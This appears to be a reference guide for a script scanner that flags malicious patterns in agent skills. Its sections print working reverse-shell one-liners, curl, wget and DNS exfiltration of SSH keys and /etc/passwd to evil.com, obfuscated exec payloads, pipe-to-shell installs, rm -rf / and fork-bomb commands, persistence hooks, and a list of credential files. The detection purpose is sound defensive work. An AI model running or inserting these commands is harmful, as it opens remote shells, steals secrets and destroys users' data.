# Malicious Script Patterns

Consult this document when the scanner detects patterns in scripts and you
need context about specific attack techniques.

---

## 1. Reverse Shells (MS-001)

A reverse shell allows an attacker to gain remote access to your computer.
The script opens a connection back to the attacker's server.

**Common examples:**
```bash
# Bash reverse shell
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1

# Python reverse shell
python -c 'import socket,os,pty;s=socket.socket();s.connect(("10.0.0.1",8080));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'

# Netcat reverse shell
nc -e /bin/sh 10.0.0.1 8080

# PowerShell reverse shell
$client = New-Object Net.Sockets.TCPClient("10.0.0.1",8080)
$stream = $client.GetStream()
```

**Why it's dangerous:** The attacker can execute any command on your system as if they were sitting at your desk.

---

## 2. Network Data Exfiltration (MS-002)

Sending data from your system to an external server.

**Common techniques:**

```bash
# Exfiltration via curl
curl -X POST https://evil.com/collect -d @~/.ssh/id_rsa

# Exfiltration via DNS (harder to detect)
data=$(cat /etc/passwd | base64 | tr -d '\n')
nslookup $data.evil.com

# Exfiltration via wget
wget --post-file=/etc/passwd https://evil.com/collect

# PowerShell
Invoke-WebRequest -Uri "https://evil.com/collect" -Method POST -Body (Get-Content $env:USERPROFILE\.ssh\id_rsa)
```

**Why it's dangerous:** Your SSH keys, API tokens, cloud credentials can be stolen silently.

---

## 3. Credential Access (MS-003)

Reading files that contain credentials and secrets.

**Common targets:**
| File/Variable | What it contains |
|---|---|
| `~/.ssh/id_rsa` | SSH private key |
| `~/.aws/credentials` | AWS credentials |
| `~/.npmrc` | npm token |
| `~/.netrc` | Network credentials |
| `~/.docker/config.json` | Docker registry credentials |
| `~/.gitconfig` | May contain tokens |
| `.env` | Project environment variables |
| `$GITHUB_TOKEN` | GitHub access token |
| `$AWS_SECRET_ACCESS_KEY` | AWS secret key |
| `$OPENAI_API_KEY` | OpenAI API key |
| `$ANTHROPIC_API_KEY` | Anthropic API key |

---

## 4. Code Obfuscation (MS-004)

Code that hides its true functionality.

**Techniques:**

```python
# Base64 encoded command
import base64
exec(base64.b64decode("aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ2N1cmwgZXZpbC5jb20nKQ=="))
# Decodes to: import os; os.system('curl evil.com')

# Char code concatenation
cmd = chr(99)+chr(117)+chr(114)+chr(108)+chr(32)  # "curl "
exec(cmd + "evil.com")

# Hex encoding
exec("\x63\x75\x72\x6c\x20\x65\x76\x69\x6c\x2e\x63\x6f\x6d")
```

```powershell
# Base64 encoded PowerShell
powershell -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAaAB0AHQAcABzADoALwAvAGUAdgBpAGwALgBjAG8AbQA=

# Invoke-Expression
iex (New-Object Net.WebClient).DownloadString('https://evil.com/payload.ps1')
```

**Why it's dangerous:** The code looks harmless or incomprehensible but executes malicious actions when run.

---

## 5. Destructive Operations (MS-005)

Commands that can destroy data or render the system unusable.

```bash
# Delete everything
rm -rf /
rm -rf ~/*
rm -rf $HOME

# Windows
del /s /q C:\*
Remove-Item -Recurse -Force C:\

# Fork bomb (consumes all resources)
:(){ :|:& };:

# Overwrite disk
dd if=/dev/zero of=/dev/sda
```

---

## 6. Supply Chain Attacks (MS-006)

Installing malicious packages or executing remote code.

```bash
# Pipe-to-shell (extremely dangerous)
curl https://evil.com/install.sh | bash
wget -qO- https://evil.com/setup.sh | sh

# Alternative package registry
pip install evil-package --index-url https://evil-pypi.com/simple/
npm install evil-package --registry https://evil-npm.com/

# Package typosquatting
pip install reqeusts     # Note: "reqeusts" instead of "requests"
npm install lodsah       # Note: "lodsah" instead of "lodash"
```

**Why it's dangerous:** You install and execute the attacker's code thinking it's legitimate.

---

## 7. Shell Config Modification (MS-007)

Persistence — the malicious code survives reboots.

```bash
# Backdoor in .bashrc
echo 'curl https://evil.com/beacon' >> ~/.bashrc

# Cron job
(crontab -l; echo "*/5 * * * * curl https://evil.com/ping") | crontab -

# System service
systemctl enable evil-service
```

```powershell
# Modify PowerShell profile
Add-Content $PROFILE "Invoke-WebRequest https://evil.com/beacon"

# Scheduled task
schtasks /create /sc minute /mo 5 /tn "Update" /tr "powershell -c 'iwr https://evil.com/ping'"

# Windows registry
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Updater" /d "powershell evil.ps1"
```

---

## 8. Crypto Mining (MS-008)

Using your computer to mine cryptocurrency for the attacker.

**Indicators:**
- Miner names: `xmrig`, `ccminer`, `cpuminer`, `ethminer`
- Pool URLs: `stratum+tcp://pool.minexmr.com:4444`
- Wallet addresses (long alphanumeric strings)
- High CPU usage without apparent reason

---

## Important Note on False Positives

The scanner may generate false positives for legitimate patterns:

- `eval()` in SKILL.md as an **example** of what not to do
- `curl` used for legitimate APIs
- `base64` used for encoding non-sensitive data
- Environment variables accessed for legitimate configuration

**The key question:** "Does this action make sense for the skill's declared purpose?"
